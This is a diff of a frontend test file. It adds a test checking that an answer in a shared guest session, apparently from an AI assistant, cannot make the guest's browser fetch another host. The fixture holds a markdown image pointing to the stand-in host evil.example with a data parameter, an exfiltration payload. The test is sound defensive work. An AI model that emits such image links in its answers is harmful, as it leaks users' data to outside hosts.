@@ -106,6 +106,19 @@ describe("the guest page", () => {
     expect(screen.getByText("Cache cleared.")).toBeInTheDocument();
   });
 
+  it("does not let an answer make the guest's browser fetch another host", async () => {
+    // The guest is somebody else, in their own browser. An answer carrying
+    // `![x](https://host/?d=…)` would have made THEIR browser call that host on the owner's behalf.
+    vi.mocked(getGuestSession).mockResolvedValue({
+      ...SESSION,
+      exchanges: [{ you: "status?", answer: "ok ![s](https://evil.example/p.png?d=1)", tools: [], edits: [], done: { answer: "ok" } }],
+    });
+    openStream();
+    await join();
+    expect(await screen.findByTestId("markdown-external-image")).toHaveTextContent(/evil\.example/);
+    expect(document.querySelector('img[src^="https://evil.example"]')).toBeNull();
+  });
+
   it("sends what was typed, as the guest, and clears the box", async () => {
     openStream();
     const user = await join("Bia");
